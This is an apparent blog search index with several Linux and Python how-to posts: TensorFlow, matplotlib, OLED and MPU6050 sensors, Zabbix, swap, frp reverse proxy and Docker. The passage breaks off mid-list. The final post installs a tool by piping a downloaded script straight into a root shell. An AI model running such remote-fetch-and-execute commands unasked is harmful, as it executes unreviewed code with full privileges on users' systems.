      <title>TensorFlow Installation</title>
      <link href="/2019/02/09/013_TensorFlow_Installation/"/>
      <url>/2019/02/09/013_TensorFlow_Installation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="System-requirements"><a href="#System-requirements" class="headerlink" title="System requirements"></a>System requirements</h2><ul><li>Ubuntu 16.04 or later (64-bit)</li><li>macOS 10.12.6 (Sierra) or later (64-bit) (no GPU support)</li><li>Windows 7 or later (64-bit) (Python 3 only)</li><li>Raspbian 9.0 or later</li></ul><h2 id="For-MacOS"><a href="#For-MacOS" class="headerlink" title="For MacOS"></a>For MacOS</h2><h3 id="Available-Python-versions"><a href="#Available-Python-versions" class="headerlink" title="Available Python versions"></a>Available Python versions</h3><ul><li>Python 2.7</li><li>Python 3.4, 3.5, 3.6</li></ul><p>Note that Python 3.7 or later is not support</p><h3 id="Install-TensorFlow"><a href="#Install-TensorFlow" class="headerlink" title="Install TensorFlow"></a>Install TensorFlow</h3><p>I use pyenv &amp; virtualenv with Python 3.6.7</p><pre><code class="lang-bash">$ pip install tensorflow</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><p>Run this script. And I will explain what does it do at the next note.</p><pre><code class="lang-python">import tensorflow as tfimport numpy as npx_data = np.random.rand(100).astype(np.float32)y_data = x_data * 0.1 + 0.3Weights = tf.Variable(tf.random_uniform([1], -100.0, 100.0))biases = tf.Variable(tf.zeros([1]))y = Weights * x_data + biasesloss = tf.reduce_mean(tf.square(y - y_data))optimizer = tf.train.GradientDescentOptimizer(0.5)train = optimizer.minimize(loss)init = tf.global_variables_initializer()sess = tf.Session()sess.run(init)for step in range(201):    sess.run(train)    if step % 20 == 0:        print(step, sess.run(Weights), sess.run(biases))</code></pre><p>If you get the following logs.</p><blockquote><p>Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</p></blockquote><p>You can simply ignore this warning by <code>export TF_CPP_MIN_LOG_LEVEL=2</code> or add following code at the top of the file</p><pre><code class="lang-python">import osos.environ[&#39;TF_CPP_MIN_LOG_LEVEL&#39;] = &#39;2&#39;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://www.tensorflow.org/install/pip" target="_blank" rel="noopener">Install TensorFlow with pip</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> ML </tag>
            
            <tag> TensorFlow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use Qt5Agg GUI backend for matplotlib on MacOS</title>
      <link href="/2019/02/08/012_Use_Qt5Agg_GUI_backend_for_matplotlib_on_MacOS/"/>
      <url>/2019/02/08/012_Use_Qt5Agg_GUI_backend_for_matplotlib_on_MacOS/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>If you use matplotlib to plot diagram on MacOS, you may get following error.</p><blockquote><p>ImportError: Python is not installed as a framework. The Mac OS X backend will not be able to function correctly if Python is not installed as a framework. See the Python documentation for more information on installing Python as a framework on Mac OS X. Please either reinstall Python as a framework, or try one of the other backends. If you are using (Ana)Conda please install python.app and replace the use of ‘python’ with ‘pythonw’. See ‘Working with Matplotlib on OSX’ in the Matplotlib FAQ for more information.</p></blockquote><p>Checkout the file <code>matplotlibrc</code> in ‘site-packages/matplotlib/mpl-data/‘ and we know we should use one of the following backends:</p><ul><li>MacOSX</li><li>Qt5Agg</li><li>Gtk3Agg</li><li>…</li></ul><img src="/2019/02/08/012_Use_Qt5Agg_GUI_backend_for_matplotlib_on_MacOS/matplotlibrc.png"><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>If you use MacOSX as the backend, you should reinstall your python with the parameter <code>--with-tcl-tk</code>. I use pyenv &amp; virtualenv to manage my python versions and I do not know how to deal with it. So i try the second option — Qt5Agg and it worked.</p><h3 id="Install-PyQt5"><a href="#Install-PyQt5" class="headerlink" title="Install PyQt5"></a>Install PyQt5</h3><pre><code class="lang-bash">$ brew install pyqt$ pip install PyQt5</code></pre><h3 id="Change-Backend"><a href="#Change-Backend" class="headerlink" title="Change Backend"></a>Change Backend</h3><p>Add the following code to the top of the file</p><pre><code class="lang-python">import matplotlibmatplotlib.use(&#39;Qt5Agg&#39;)</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="lang-python">import matplotlibmatplotlib.use(&#39;Qt5Agg&#39;)import numpy as npimport matplotlib.pyplot as pltfrom matplotlib import animationspeed = 0.03fig, ax = plt.subplots()x = np.arange(0, 2 * np.pi, 0.01)line, = ax.plot(x, np.sin(x))ani = animation.FuncAnimation(    fig=fig,    func=lambda i: line.set_ydata(np.sin(x + i * speed)),    frames=int(2 * np.pi / speed),    init_func=lambda: line.set_ydata(np.sin(x)),    interval=1,    blit=False)plt.show()</code></pre><img src="/2019/02/08/012_Use_Qt5Agg_GUI_backend_for_matplotlib_on_MacOS/animate.gif">]]></content>
      
      
      <categories>
          
          <category> Solutions </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Matplotlib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OLED SH1106 Tutorial</title>
      <link href="/2019/02/06/011_OLED_SH1106_Tutorial/"/>
      <url>/2019/02/06/011_OLED_SH1106_Tutorial/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Appearance"><a href="#Appearance" class="headerlink" title="Appearance"></a>Appearance</h2><img src="/2019/02/06/011_OLED_SH1106_Tutorial/oled_sh1106.png"><h2 id="Pins"><a href="#Pins" class="headerlink" title="Pins"></a>Pins</h2><ul><li><span class="highlight">VCC</span> this pin is used for powering the MPU6050 module with respect to ground</li><li><span class="highlight">GND</span> this is a ground pin</li><li><span class="highlight">SDA</span> SDA pin is used for data between controller and module</li><li><span class="highlight">SCL</span> SCL pin is used for clock input</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>OrangePi PC Plus / Ubuntu 16.04<br>Python 2.7</p><h3 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h3><ul><li>smbus</li></ul><pre><code class="lang-bash">$ apt install python-smbus</code></pre><h3 id="Enjoy-Drawing"><a href="#Enjoy-Drawing" class="headerlink" title="Enjoy Drawing"></a>Enjoy Drawing</h3><pre><code class="lang-python">from oled.device import sh1106from oled.render import canvasfrom PIL import ImageFont, Imageimport qrcodedef main():    qr = qrcode.QRCode(        version=1,        error_correction=qrcode.constants.ERROR_CORRECT_L,        box_size=2,        border=3,    )    qr.add_data(&#39;http://vincentstudio.info&#39;)    qr.make(fit=True)    img = qr.make_image()    img.save(&#39;./images/code.png&#39;)    oled = sh1106(port=0, address=0x3C)    font = ImageFont.truetype(&#39;./fonts/C&amp;C Red Alert [INET].ttf&#39;, 12)    with canvas(oled) as draw:        logo = Image.open(&#39;images/code.png&#39;)        draw.bitmap((0, 1), logo, fill=1)        draw.text((75, 20), &#39;Vincent&#39;, font=font, fill=1)        draw.text((90, 32 ), &#39;Studio&#39;, font=font, fill=1)if __name__ == &quot;__main__&quot;:    main()</code></pre><h3 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h3><img src="/2019/02/06/011_OLED_SH1106_Tutorial/demo.png"><h2 id="Download-Project"><a href="#Download-Project" class="headerlink" title="Download Project"></a>Download Project</h2><p><a href="https://github.com/Vincent0700/oled_sh1106.git" target="_blank" rel="noopener">https://github.com/Vincent0700/oled_sh1106.git</a></p><p>The repos for the example project above. It’s simple.</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zabbix 4.0 Single Node Configuration</title>
      <link href="/2019/02/03/010_Zabbix_4.0_single_node_configuration/"/>
      <url>/2019/02/03/010_Zabbix_4.0_single_node_configuration/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Zabbix is an enterprise-class open source distributed monitoring solution.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Zabbix is software that monitors numerous parameters of a network and the health and integrity of servers. Zabbix uses a flexible notification mechanism that allows users to configure e-mail based alerts for virtually any event. This allows a fast reaction to server problems. Zabbix offers excellent reporting and data visualisation features based on the stored data. This makes Zabbix ideal for capacity planning.</p><h2 id="Support-Platform"><a href="#Support-Platform" class="headerlink" title="Support Platform"></a>Support Platform</h2><ul><li>Red Hat Enterprise Linux</li><li>CentOS</li><li>Oracle Linux</li><li>Ubuntu</li><li>Debian</li><li>SUSE Linux Enterprise Server</li><li>Raspbian</li></ul><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Click <a href="https://www.zabbix.com/download?zabbix=4.0&amp;os_distribution=ubuntu&amp;os_version=16.04_xenial&amp;db=mysql" target="_blank" rel="noopener">here</a> &amp; Choose your platform</p><img src="/2019/02/03/010_Zabbix_4.0_single_node_configuration/zabbix_installation.png"><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><ul><li>Open URL: http://<server_ip_or_name>/zabbix</server_ip_or_name></li><li>Follow the instructions &amp; Click Next</li><li>Login by default account:<br><code>username</code> Admin<br><code>password</code> zabbix</li><li>Set your language by click usericon on top right corner</li></ul><h2 id="Enjoy"><a href="#Enjoy" class="headerlink" title="Enjoy"></a>Enjoy</h2><img src="/2019/02/03/010_Zabbix_4.0_single_node_configuration/zabbix_2.png"> <img src="/2019/02/03/010_Zabbix_4.0_single_node_configuration/zabbix_1.png"><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://www.zabbix.com/download?zabbix=4.0&amp;os_distribution=ubuntu&amp;os_version=16.04_xenial&amp;db=mysql" target="_blank" rel="noopener">Install Zabbix from Package</a><br>[2] <a href="https://www.zabbix.com/documentation/4.0/manual" target="_blank" rel="noopener">Zabbix Manual</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to add or remove swap space</title>
      <link href="/2019/02/03/009_How_to_add_or_remove_swap_space/"/>
      <url>/2019/02/03/009_How_to_add_or_remove_swap_space/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Swap space refers to the portion of the virtual memory which is reserved as a temporary storage location.</p><h2 id="Check-memory-and-available-space"><a href="#Check-memory-and-available-space" class="headerlink" title="Check memory and available space"></a>Check memory and available space</h2><pre><code class="lang-bash">$ free -mh</code></pre><img src="/2019/02/03/009_How_to_add_or_remove_swap_space/shell_free_mh.png"><pre><code class="lang-bash">$ df -h</code></pre><img src="/2019/02/03/009_How_to_add_or_remove_swap_space/shell_df_h.png"><h2 id="Enable-the-swap-file"><a href="#Enable-the-swap-file" class="headerlink" title="Enable the swap file"></a>Enable the swap file</h2><pre><code class="lang-bash"># create a 2G swap file$ dd if=/dev/zero of=/myswap bs=1024 count=2048000# mark the file as swap space$ mkswap /myswap# enable the swap file$ swapon /myswap</code></pre><img src="/2019/02/03/009_How_to_add_or_remove_swap_space/shell_free_mh_2.png"><h2 id="Make-the-swap-file-permanent"><a href="#Make-the-swap-file-permanent" class="headerlink" title="Make the swap file permanent"></a>Make the swap file permanent</h2><pre><code class="lang-bash">$ echo &#39;/myswap none swap sw 0 0&#39; &gt;&gt; /etc/fstab</code></pre><h2 id="Disable-the-swap-space"><a href="#Disable-the-swap-space" class="headerlink" title="Disable the swap space"></a>Disable the swap space</h2><pre><code class="lang-bash">$ swapoff /var/swap$ rm /swap</code></pre><p>Then you should remove the line includes ‘/swap’ from /etc/fstab</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://www.digitalocean.com/community/tutorials/how-to-add-swap-space-on-ubuntu-16-04" target="_blank" rel="noopener">How To Add Swap Space on Ubuntu 16.04</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get MPU6050 data through websocket</title>
      <link href="/2019/02/02/008_Get_MPU6050_data_through_websocket/"/>
      <url>/2019/02/02/008_Get_MPU6050_data_through_websocket/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>MPU-6050 is an 8 pin 6 axis gyro and accelerometer in a single chip. This module works on I2C serial communication by default but it can be configured for SPI interface by configuring it register. For I2C this has SDA and SCL lines.</p></blockquote><h2 id="Appearance"><a href="#Appearance" class="headerlink" title="Appearance"></a>Appearance</h2><img src="/2019/02/02/008_Get_MPU6050_data_through_websocket/mpu6050.png"><h2 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h2><h3 id="MPU6050-Pins"><a href="#MPU6050-Pins" class="headerlink" title="MPU6050 Pins"></a>MPU6050 Pins</h3><ul><li><span class="highlight">VCC</span> this pin is used for powering the MPU6050 module with respect to ground</li><li><span class="highlight">GND</span> this is a ground pin</li><li><span class="highlight">SDA</span> SDA pin is used for data between controller and mpu6050 module</li><li><span class="highlight">SCL</span> SCL pin is used for clock input</li><li><span class="highlight">XDA</span> This is sensor I2C SDA Data line for configuring and reading from external sensors (not use)</li><li><span class="highlight">XCL</span> This is sensor I2C SCL clock line for configuring and reading from external sensors (not use)</li><li><span class="highlight">ADO</span> I2C Slave Address LSB (not use)</li><li><span class="highlight">INT</span> Interrupt pin for indication of data ready. (not use)</li></ul><h3 id="GPIO-Configuration"><a href="#GPIO-Configuration" class="headerlink" title="GPIO Configuration"></a>GPIO Configuration</h3><img src="/2019/02/02/008_Get_MPU6050_data_through_websocket/gpio.png"> <img src="/2019/02/02/008_Get_MPU6050_data_through_websocket/pin_configuration.png"><h2 id="Program"><a href="#Program" class="headerlink" title="Program"></a>Program</h2><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>OrangePi PC Plus / Ubuntu 16.04<br>Python 3.7</p><h3 id="Download-driver"><a href="#Download-driver" class="headerlink" title="Download driver"></a>Download driver</h3><p><a href="https://github.com/Tijndagamer/mpu6050" target="_blank" rel="noopener">https://github.com/Tijndagamer/mpu6050</a></p><h3 id="Communication"><a href="#Communication" class="headerlink" title="Communication"></a>Communication</h3><p>I wrote a simple flask-SocketIO program to communicate with mpu6050</p><pre><code class="lang-python">import loggingfrom flask import Flask, request, render_templatefrom flask_socketio import SocketIO, emitfrom app.mpu6050 import mpu6050app = Flask(__name__)socketio = SocketIO(app)sensor = mpu6050(address=0x68, bus=0)log = logging.getLogger(&#39;werkzeug&#39;)log.setLevel(logging.ERROR)@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])def index():    return render_template(&#39;index.html&#39;, interval=100)@socketio.on(&#39;connect&#39;, namespace=&#39;/mpu6050&#39;)def on_mpu6050_connect():    print(f&#39;Client {request.remote_addr} connected&#39;)@socketio.on(&#39;get_data&#39;, namespace=&#39;/mpu6050&#39;)def on_mpu6050_get_data():    accel_data = sensor.get_accel_data()    gyro_data = sensor.get_gyro_data()    temp = sensor.get_temp()    emit(&#39;recv_data_mpu6050&#39;, dict(        accel_data=accel_data,        gyro_data=gyro_data,        centidegree=temp    ))</code></pre><p>Web template</p><pre><code class="lang-html">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot;          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0,          maximum-scale=1.0, minimum-scale=1.0&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;    &lt;title&gt;ws_mpu6050&lt;/title&gt;    &lt;style&gt;        * {            margin: 0;            padding: 0;        }        table.dataset {            background: #333;            color: #fff;        }        table.dataset td {            width: 80px;            padding: 5px 10px;            border: 1px solid #fff;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt;    &lt;table class=&quot;dataset&quot;&gt;        &lt;tr&gt;            &lt;td&gt;accel_data&lt;/td&gt;            &lt;td id=&quot;accel_x&quot;&gt;&lt;/td&gt;            &lt;td id=&quot;accel_y&quot;&gt;&lt;/td&gt;            &lt;td id=&quot;accel_z&quot;&gt;&lt;/td&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;gyro_data&lt;/td&gt;            &lt;td id=&quot;gyro_x&quot;&gt;&lt;/td&gt;            &lt;td id=&quot;gyro_y&quot;&gt;&lt;/td&gt;            &lt;td id=&quot;gyro_z&quot;&gt;&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/ul&gt;&lt;script src=&quot;/static/js/libs/socket.io/socket.io.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;    const socket = io.connect(`${location.host}/mpu6050`);    let data = {};    socket.on(&quot;connect&quot;, function () {        setInterval(function () {            socket.emit(&quot;get_data&quot;)        }, {{ interval }});    });    socket.on(&quot;recv_data_mpu6050&quot;, function (msg) {        if (msg &amp;&amp; msg.accel_data &amp;&amp; msg.gyro_data &amp;&amp; msg.centidegree) {            data = msg;            const accel = data.accel_data;            const gyro = data.gyro_data;            document.getElementById(&quot;accel_x&quot;).innerHTML = accel.x.toFixed(5);            document.getElementById(&quot;accel_y&quot;).innerHTML = accel.y.toFixed(5);            document.getElementById(&quot;accel_z&quot;).innerHTML = accel.z.toFixed(5);            document.getElementById(&quot;gyro_x&quot;).innerHTML = gyro.x.toFixed(5);            document.getElementById(&quot;gyro_y&quot;).innerHTML = gyro.y.toFixed(5);            document.getElementById(&quot;gyro_z&quot;).innerHTML = gyro.z.toFixed(5);        }    })&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>The full program is at <a href="https://github.com/Vincent0700/ws_mpu6050" target="_blank" rel="noopener">https://github.com/Vincent0700/ws_mpu6050</a>. You can clone my code by:</p><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/ws_mpu6050.git</code></pre><h3 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h3><img src="/2019/02/02/008_Get_MPU6050_data_through_websocket/ws_mpu6050.gif"><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://circuitdigest.com/microcontroller-projects/mpu6050-gyro-sensor-interfacing-with-raspberry-pi" target="_blank" rel="noopener">MPU6050 Gyro Sensor Interfacing with Raspberry Pi</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arm </tag>
            
            <tag> Sensor </tag>
            
            <tag> MPU6050 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后动优势 (Second-mover advantage)</title>
      <link href="/2019/02/01/007_Second-mover_advantage/"/>
      <url>/2019/02/01/007_Second-mover_advantage/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>The early bird may get the worm, but the second mouse gets the cheese in the trap.</p></blockquote><p>我了解这个理论起源于《Sense 8》里的一个片段，具体情节参见 S01E08 09:15。</p><img src="/2019/02/01/007_Second-mover_advantage/second_mover_advantage.png"> <img src="/2019/02/01/007_Second-mover_advantage/second_mover_advantage_2.png"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="MBALib中的解释"><a href="#MBALib中的解释" class="headerlink" title="MBALib中的解释"></a>MBALib中的解释</h3><p>后动优势(late-mover advantage；Second-mover advantage；又称为次动优势、后发优势、先动劣势)是指相对于行业的先进入企业，后进入者由于较晚进入行业而获得的较先动企业不具有的竞争优势，通过观察先动者的行动及效果来减少自身面临的不确定性而采取相应行动，获得更多的市场份额。例如：研发成本优势、行业风险把握优势等。</p><h3 id="后动优势的来源"><a href="#后动优势的来源" class="headerlink" title="后动优势的来源"></a>后动优势的来源</h3><ol><li>后动企业可以从先驱企业的错误中学习，进而可以获得差别化和成本优势。</li><li>后动企业可以通过“搭便车”，来降低产品成本，获得成本优势。</li><li>后动企业可以通过创新，改变游戏规则，获得竞争优势。</li><li>市场情况发生变化时，后动企业有可能获得优势。</li></ol><h2 id="我的想法"><a href="#我的想法" class="headerlink" title="我的想法"></a>我的想法</h2><ul><li>学习或涉足任何新的事物时，首先看是否已经有人对此有所涉猎或见解。如果有，取其经验（搭便车）；如果没有，检视是否自己的学习渠道不够宽。</li><li>当已经在某件事或行业上颇有建树的时候，审视周围的”后动着”，是否有新的见解。</li><li>不要急于求成。</li><li>拓宽眼界比埋头干活更重要。</li><li>莫名想起《Braveheart》里的一句台词，虽然可能不太合题：<br><i style="color:#31c395">“One day, you will be a queen. And you must open your eyes.”</i></li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://wiki.mbalib.com/wiki/%E5%90%8E%E5%8A%A8%E4%BC%98%E5%8A%BF" target="_blank" rel="noopener">后动优势 - MBA智库百科</a><br>[2] <a href="https://wiki.mbalib.com/wiki/%E5%90%8E%E5%8F%91%E4%BC%98%E5%8A%BF%E7%90%86%E8%AE%BA" target="_blank" rel="noopener">后发优势理论 - MBA智库百科</a><br>[3] <a href="https://quoteinvestigator.com/2013/01/25/second-mouse/" target="_blank" rel="noopener">The Second Mouse Gets the Cheese - Quote Investigator</a></p>]]></content>
      
      
      <categories>
          
          <category> Methodology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thoughts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse Proxy Tools - frp</title>
      <link href="/2019/01/07/006_Reverse_Proxy_Tools_-_frp/"/>
      <url>/2019/01/07/006_Reverse_Proxy_Tools_-_frp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. As of now, it supports tcp &amp; udp, as well as http and https protocols, where requests can be forwarded to internal services by domain name.</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Our purpose is to access LAN devices from the external network. And we have a server which have public IP. How can we connect LAN device through it?</p><img src="/2019/01/07/006_Reverse_Proxy_Tools_-_frp/reverse_proxy_structure.png"><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>Download compiled binaries at <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a></p><img src="/2019/01/07/006_Reverse_Proxy_Tools_-_frp/frp_files.png"><p>Move frp folder to /usr/local/frp<br>Create soft links</p><pre><code class="lang-bash">$ ln -s /usr/local/frp/frps /usr/local/frps$ ln -s /usr/local/frp/frpc /usr/local/frpc</code></pre><p>Move frps.ini &amp; frpc.ini to /etc/frp/</p><h3 id="For-Reverse-Proxy-Server"><a href="#For-Reverse-Proxy-Server" class="headerlink" title="For Reverse Proxy Server"></a>For Reverse Proxy Server</h3><p>Edit config file - frps.ini</p><pre><code class="lang-ini">[common]bind_addr = 0.0.0.0bind_port = 7000token = vincentallow_ports = 3001,3003,4000-50000max_pool_count = 5login_fail_exit = falsedashboard_addr = 0.0.0.0dashboard_port = 7500dashboard_user = admindashboard_pwd = adminlog_file = ./frps.loglog_level = infolog_max_days = 3</code></pre><p>Start frp server</p><pre><code class="lang-bash">$ sudo ./frps -c frps.ini</code></pre><p>View frp status at dashboard (<a href="http://serverip:7500" target="_blank" rel="noopener">http://serverip:7500</a>)</p><img src="/2019/01/07/006_Reverse_Proxy_Tools_-_frp/frp_dashboard.png"><h3 id="For-Target-Server"><a href="#For-Target-Server" class="headerlink" title="For Target Server"></a>For Target Server</h3><p>Edit config file - frpc.ini</p><pre><code class="lang-ini">[common]server_addr = serveripserver_port = 7000token = javen[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 3001</code></pre><p>Start frp client</p><pre><code class="lang-bash">$ sudo ./frpc -c frpc.ini</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="lang-bash">$ ssh root@serverip -p 3001</code></pre><h2 id="Startup"><a href="#Startup" class="headerlink" title="Startup"></a>Startup</h2><p>How to Run frp at startup?</p><h3 id="Way1-Use-systemctl"><a href="#Way1-Use-systemctl" class="headerlink" title="Way1: Use systemctl"></a>Way1: Use systemctl</h3><p>Edit /etc/systemd/system/frps.service</p><pre><code class="lang-ini">[Unit]Description=frps daemon[Service]Type=simpleExecStart=/usr/local/frp/frps -c /etc/frp/frps.ini[Install]WantedBy=multi-user.target</code></pre><p>Start service</p><pre><code class="lang-bash">$ systemctl start frps$ systemctl enable frps</code></pre><h3 id="Way2-Use-supervisor"><a href="#Way2-Use-supervisor" class="headerlink" title="Way2: Use supervisor"></a>Way2: Use supervisor</h3><p>Edit /etc/supervisor/conf.d/frps.ini</p><pre><code class="lang-ini">[program:frps]command=/usr/local/frp/frps -c /etc/frp/frps.iniautorestart=true</code></pre><p>Reload supervisor config file</p><pre><code class="lang-bash">$ sudo supervisorctl reload</code></pre>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Installation</title>
      <link href="/2019/01/01/005_Docker_Installation/"/>
      <url>/2019/01/01/005_Docker_Installation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://www.docker.com/" target="_blank" rel="noopener">https://www.docker.com/</a></p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Way1-Install-from-apt-Recommend"><a href="#Way1-Install-from-apt-Recommend" class="headerlink" title="Way1: Install from apt (Recommend)"></a>Way1: Install from apt (Recommend)</h3><p>OS: Ubuntu 16.04 LTS</p><pre><code class="lang-bash">$ sudo apt install apt-transport-https ca-certificates curl software-properties-common$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -$ sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;$ sudo apt update$ sudo apt install docker-ce$ sudo systemctl enable docker$ sudo systemctl start docker</code></pre><h3 id="Way2-Install-from-official-binary-package"><a href="#Way2-Install-from-official-binary-package" class="headerlink" title="Way2: Install from official binary package"></a>Way2: Install from official binary package</h3><p>Download package from<br><a href="https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/</a></p><img src="/2019/01/01/005_Docker_Installation/download.png"><pre><code class="lang-bash">$ sudo dpkg -i xxx.deb</code></pre>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sourcelist switcher</title>
      <link href="/2018/12/21/004_Sourcelist_switcher/"/>
      <url>/2018/12/21/004_Sourcelist_switcher/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>A sourcelist switcher for ubuntu<br><a href="https://github.com/Vincent0700/static-libraries/tree/master/source/sourcelist-switcher" target="_blank" rel="noopener">https://github.com/Vincent0700/static-libraries/tree/master/source/sourcelist-switcher</a></p><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><img src="/2018/12/21/004_Sourcelist_switcher/sourcelist-switcher.gif"><h2 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h2><ul><li>wget</li><li>apt-transport-https</li><li>bc</li></ul><pre><code class="lang-bash">$ sudo apt install wget apt-transport-https bc</code></pre><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code class="lang-bash">$ sudo bash -c &quot;$(wget -q -O - https://raw.githubusercontent.com/Vincent0700/static-libraries/master/source/sourcelist-switcher/run.sh)&quot;</code></pre><h2 id="Platform"><a href="#Platform" class="headerlink" title="Platform:"></a>Platform:</h2><ul><li>ubuntu 14.04 trusty</li><li>ubuntu 